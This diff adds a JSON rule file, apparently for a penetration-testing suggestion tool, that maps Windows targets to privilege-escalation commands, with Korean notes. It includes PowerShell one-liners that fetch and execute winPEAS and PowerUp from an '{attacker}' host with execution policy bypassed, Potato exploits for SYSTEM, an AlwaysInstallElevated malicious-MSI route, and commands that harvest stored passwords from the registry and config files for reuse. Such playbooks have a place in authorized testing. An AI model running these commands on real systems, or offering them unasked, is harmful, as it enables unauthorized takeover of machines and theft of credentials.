@@ -1,0 +1,77 @@
+[
+  {
+    "name": "Windows privesc 자동열거(winPEAS)",
+    "when": {"os": ["windows", "windows_ad"]},
+    "suggest": [
+      "winPEASx64.exe quiet",
+      "powershell -ep bypass -c \"iex(iwr -useb http://{attacker}/winPEAS.ps1)\""
+    ],
+    "note": "셸 확보 후 대상에서 실행. {attacker} 치환은 수동(전송 호스트).",
+    "tags": ["privesc", "windows", "winpeas"],
+    "phase": "privesc"
+  },
+  {
+    "name": "토큰 권한 점검",
+    "when": {"os": ["windows", "windows_ad"]},
+    "suggest": ["whoami /priv", "whoami /all"],
+    "note": "SeImpersonate/SeAssignPrimaryToken → Potato 계열로 SYSTEM. 서비스계정 흔함.",
+    "tags": ["privesc", "windows", "token"],
+    "phase": "privesc"
+  },
+  {
+    "name": "SeImpersonate → Potato",
+    "when": {"os": ["windows", "windows_ad"]},
+    "suggest": [
+      "PrintSpoofer64.exe -i -c cmd",
+      "GodPotato -cmd \"cmd /c whoami\""
+    ],
+    "note": "SeImpersonatePrivilege 보유 시 SYSTEM 획득. 서비스/웹셸 컨텍스트에서 흔함.",
+    "tags": ["privesc", "windows", "potato"],
+    "phase": "privesc"
+  },
+  {
+    "name": "서비스 오구성(비인용 경로/약한 권한)",
+    "when": {"os": ["windows", "windows_ad"]},
+    "suggest": [
+      "accesschk64.exe -uwcqv \"Everyone\" * /accepteula",
+      "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\""
+    ],
+    "note": "비인용 경로 + 쓰기가능 디렉토리, 또는 서비스 바이너리 교체권 → SYSTEM.",
+    "tags": ["privesc", "windows", "service"],
+    "phase": "privesc"
+  },
+  {
+    "name": "AlwaysInstallElevated",
+    "when": {"os": ["windows", "windows_ad"]},
+    "suggest": [
+      "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+      "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+    ],
+    "note": "양쪽 다 1 이면 악성 MSI(msfvenom)로 SYSTEM 설치.",
+    "tags": ["privesc", "windows", "registry"],
+    "phase": "privesc"
+  },
+  {
+    "name": "저장된 자격증명 수집",
+    "when": {"os": ["windows", "windows_ad"]},
+    "suggest": [
+      "cmdkey /list",
+      "reg query HKLM /f password /t REG_SZ /s",
+      "findstr /si password *.xml *.ini *.config *.txt"
+    ],
+    "note": "unattend.xml/웹설정/자격증명 관리자. runas /savecred 로 재사용.",
+    "tags": ["privesc", "windows", "creds"],
+    "phase": "privesc"
+  },
+  {
+    "name": "PowerUp/SharpUp 점검",
+    "when": {"os": ["windows", "windows_ad"]},
+    "suggest": [
+      "powershell -ep bypass -c \"iex(iwr -useb http://{attacker}/PowerUp.ps1); Invoke-AllChecks\"",
+      "SharpUp.exe audit"
+    ],
+    "note": "서비스/레지스트리/경로 오구성을 자동 점검. {attacker} 수동.",
+    "tags": ["privesc", "windows", "powerup"],
+    "phase": "privesc"
+  }
+]
